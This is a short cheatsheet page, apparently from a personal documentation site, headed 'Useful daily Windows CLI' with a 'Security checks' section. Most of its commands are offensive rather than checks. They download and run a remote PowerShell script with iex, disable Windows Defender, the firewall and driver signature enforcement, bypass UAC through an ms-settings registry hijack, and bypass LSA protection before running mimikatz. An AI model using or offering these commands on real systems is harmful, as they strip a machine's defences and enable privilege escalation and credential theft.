---
layout: default
title: Useful daily Windows CLI
parent: Windows
category: Windows Sysadmin
grand_parent: Cheatsheets
---

# {{ page.title }}

## Security checks

```batch
# listing kb
wmic qfe list full /format:table

# donwload ps activedirectory module 
iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory

# windows defender: disable
powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true

# windows defender: check status
powershell -inputformat none -outputformat text -NonInteractive -Command 'Get-MpPreference | select -ExpandProperty "DisableRealtimeMonitoring"'

# windows firewall: disable
netsh advfirewall set publicprofile state off
netsh advfirewall set privateprofile state off
netsh advfirewall set domainprofile state off
netsh advfirewall set allprofiles state off

# windows firewall: check status
# logfile: %systemroot%\system32\LogFiles\Firewall\pfirewall.log
netsh advfirewall show allprofiles

# windows uac: bypass
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force

# Windows lsaprotection: bypass
powershell .\ConsoleApplication1.exe/InstallDriver
powershell .\ConsoleApplication1.exe/makeSYSTEMcmd
powershell .\ConsoleApplication1.exe/disableLSAProtection
powershell .\ConsoleApplication1.exe/uninstallDriver
powershell .\mimikatz.exe

# Windows dirver signature: disable
bcdedit.exe /set nointegritychecks on
bcdedit.exe /set testsigning on
```
